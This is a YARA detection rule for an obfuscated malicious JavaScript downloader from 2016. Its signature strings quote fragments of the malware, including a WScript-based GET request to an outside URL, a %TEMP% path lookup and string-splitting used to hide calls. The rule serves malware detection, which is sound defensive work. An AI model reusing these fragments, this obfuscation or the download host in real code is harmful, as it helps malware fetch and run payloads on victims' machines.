rule sig_20160428_ff3592abd8fe7488c9c77a6b0edf59f9 {
  meta:
    description = "datamaliciousorder - file 20160428_ff3592abd8fe7488c9c77a6b0edf59f9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2ff850e8812839692914ef8581db26b039e578f3e9e34e948def72d2b6ac00c6"

  strings:
    $s1  = "RqdHevTfmMczJgvUfkZth[TqsMaiUzrKrbFbyMyeZlq](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function ScsKxrDyvZirWfiKmsZac(FnuVibWniZsyUxfNmvVui){EegSpnLpsFfqDzgQjxYgu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function ScsKxrDyvZirWfiKmsZac(FnuVibWniZsyUxfNmvVui){EegSpnLpsFfqDzgQjxYgu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function JqcVatVsjEtiKpnDavYzy() {return EegSpnLpsFfqDzgQjxYgu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return IhsInoVpsCroJzcDmzJht - FkhEioBiaLchWcjIadGbf;};" fullword ascii
    $s6  = "var EegSpnLpsFfqDzgQjxYgu = function WzsSygXczOykGdqMcmLzw() {return WmaDmyMlgVbaAiiOduBbo[HazZbqHevKgtJrpLqvCjm](\"WScript\"+\"" ascii
    $s7  = "function HvyJsgZxiGcdCjcOpcMot(IhsInoVpsCroJzcDmzJht, FkhEioBiaLchWcjIadGbf){FkrStvHiaQoyRqnLlmJpx = FkrStvHiaQoyRqnLlmJpx * 1; " ascii
    $s8  = "var EegSpnLpsFfqDzgQjxYgu = function WzsSygXczOykGdqMcmLzw() {return WmaDmyMlgVbaAiiOduBbo[HazZbqHevKgtJrpLqvCjm](\"WScript\"+\"" ascii
    $s9  = "var WmaDmyMlgVbaAiiOduBbo = this[\"WScript\"];" fullword ascii
    $s10 = "function JqcVatVsjEtiKpnDavYzy() {return EegSpnLpsFfqDzgQjxYgu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function HvyJsgZxiGcdCjcOpcMot(IhsInoVpsCroJzcDmzJht, FkhEioBiaLchWcjIadGbf){FkrStvHiaQoyRqnLlmJpx = FkrStvHiaQoyRqnLlmJpx * 1; " ascii
    $s12 = "function UuiHoeIcvJpoSspSgcLpt(){return MbdUyzYlfXhuQyxRmgHlv + \"\";};" fullword ascii
    $s13 = "if (RqdHevTfmMczJgvUfkZth[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function XfuKjgVjtTgqDigVbzTxc() {return ((OkjFsqXdkKkeMauYqxCxe == true) && (OkjFsqXdkKkeMauYqxCxe == KhlHgkEnzPgxEgrYsbIlm)) ?" ascii
    $s15 = "function XfuKjgVjtTgqDigVbzTxc() {return ((OkjFsqXdkKkeMauYqxCxe == true) && (OkjFsqXdkKkeMauYqxCxe == KhlHgkEnzPgxEgrYsbIlm)) ?" ascii
    $s16 = "var KhlHgkEnzPgxEgrYsbIlm = false;" fullword ascii
    $s17 = "function GhcYnjLzqVlsXikOjoZqp(){return HazZbqHevKgtJrpLqvCjm;};" fullword ascii
    $s18 = "return HvyJsgZxiGcdCjcOpcMot(1 == 1 ? AraTswEzbIzyRabKwuCgf : 0, 1 == 1 ? FktLrnMebZxkIsmRjeJyg : 0);" fullword ascii
    $s19 = "EinKzaZniOupAywXveStm = true;" fullword ascii
    $s20 = "KhlHgkEnzPgxEgrYsbIlm = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}